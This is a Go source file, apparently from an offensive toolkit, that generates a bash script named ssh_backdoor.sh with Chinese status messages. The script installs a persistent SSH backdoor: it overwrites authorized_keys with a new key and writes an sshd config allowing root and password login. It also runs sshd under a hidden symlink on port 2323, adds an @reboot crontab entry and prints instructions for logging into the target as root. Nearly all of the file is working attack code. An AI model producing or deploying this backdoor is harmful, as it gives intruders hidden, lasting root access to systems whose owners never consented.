package ssh

import (
	"fmt"
	"os"
	"path/filepath"
	"text/template"
	"time"
)

type SSHBackdoor struct {
	Port     int
	LinkPath string
	KeyPath  string
}

func NewSSHBackdoor() *SSHBackdoor {
	return &SSHBackdoor{
		Port:     2323,
		LinkPath: "/tmp/.sshd",
		KeyPath:  "/tmp/.ssh_key",
	}
}

func (s *SSHBackdoor) GeneratePayload(outDir string) error {
	mainScript := `#!/bin/bash
# SSH Backdoor Generator
# Generated at: {{.Timestamp}}

SSH_PORT={{.Port}}
LINK_PATH="{{.LinkPath}}"
KEY_PATH="{{.KeyPath}}"

# 创建隐藏目录
HIDE_DIR="/var/tmp/.system"
mkdir -p $HIDE_DIR

echo "[+] 生成SSH密钥对..."
ssh-keygen -t ed25519 -f $KEY_PATH -N "" 2>/dev/null

echo "[+] 设置.ssh目录权限..."
mkdir -p ~/.ssh
chmod 700 ~/.ssh
ls -la ~ | grep .ssh

echo "[+] 添加公钥到authorized_keys..."
cat ${KEY_PATH}.pub > ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
ls -la ~/.ssh/
echo "authorized_keys内容:"
cat ~/.ssh/authorized_keys

echo "[+] 创建sshd配置..."
cat > /tmp/sshd_config << EOF
Port $SSH_PORT
HostKey /etc/ssh/ssh_host_rsa_key
HostKey /etc/ssh/ssh_host_ecdsa_key
HostKey /etc/ssh/ssh_host_ed25519_key

AuthorizedKeysFile %h/.ssh/authorized_keys
PubkeyAuthentication yes
PasswordAuthentication yes
PermitRootLogin yes
StrictModes no

UsePAM yes
X11Forwarding yes
PrintMotd no

LogLevel DEBUG3

AcceptEnv LANG LC_*
Subsystem	sftp	/usr/lib/openssh/sftp-server
EOF

echo "[+] 验证sshd配置..."
/usr/sbin/sshd -t -f /tmp/sshd_config

echo "[+] 启动SSH服务..."
ln -sf /usr/sbin/sshd $LINK_PATH
pkill -f "$LINK_PATH -f /tmp/sshd_config"
$LINK_PATH -f /tmp/sshd_config -D -E /tmp/sshd.log &

# 等待服务启动
sleep 2

echo "[+] 验证SSH服务状态..."
ps aux | grep sshd
netstat -tlnp | grep $SSH_PORT

echo "[+] 添加持久化..."
echo "@reboot $LINK_PATH -f /tmp/sshd_config -D" | crontab -

echo "[+] 保存并设置私钥权限..."
install -m 600 $KEY_PATH ./id_ed25519
# 验证私钥权限
ls -la ./id_ed25519

echo "[+] 清理临时文件..."
rm -f ${KEY_PATH}*

echo "[+] SSH后门安装完成"
echo "[+] 后门端口: $SSH_PORT"
echo "[+] 使用方法:"
echo "    1. 使用密钥登录:"
echo "       ssh -i ./id_ed25519 -p $SSH_PORT root@<目标IP>"
echo "    2. 使用密码登录:"
echo "       ssh -p $SSH_PORT root@<目标IP>"
echo
echo "[+] 重要提示:"
echo "    确保私钥文件权限为600: chmod 600 ./id_ed25519"
echo
echo "[+] 调试命令:"
echo "    查看sshd日志:   tail -f /tmp/sshd.log"
echo "    查看sshd配置:   cat /tmp/sshd_config"
echo "    查看公钥:       cat ~/.ssh/authorized_keys"
echo "    查看私钥权限:   ls -la ./id_ed25519"
echo "    查看进程:       ps aux | grep sshd"
echo "    查看端口:       netstat -tlnp | grep $SSH_PORT"
echo
echo "[+] 测试连接:"
echo "    ssh -v -i ./id_ed25519 -p $SSH_PORT -o StrictHostKeyChecking=no root@127.0.0.1"
`
	scriptPath := filepath.Join(outDir, "ssh_backdoor.sh")
	return s.writeFile(scriptPath, mainScript, struct {
		Timestamp string
		Port      int
		LinkPath  string
		KeyPath   string
	}{
		Timestamp: time.Now().Format("2006-01-02 15:04:05"),
		Port:      s.Port,
		LinkPath:  s.LinkPath,
		KeyPath:   s.KeyPath,
	})
}

func (s *SSHBackdoor) writeFile(filepath string, content string, data interface{}) error {
	tmpl, err := template.New("ssh").Parse(content)
	if err != nil {
		return fmt.Errorf("failed to parse template: %v", err)
	}

	f, err := os.Create(filepath)
	if err != nil {
		return fmt.Errorf("failed to create file: %v", err)
	}
	defer f.Close()

	if err := tmpl.Execute(f, data); err != nil {
		return fmt.Errorf("failed to execute template: %v", err)
	}

	return os.Chmod(filepath, 0755)
}
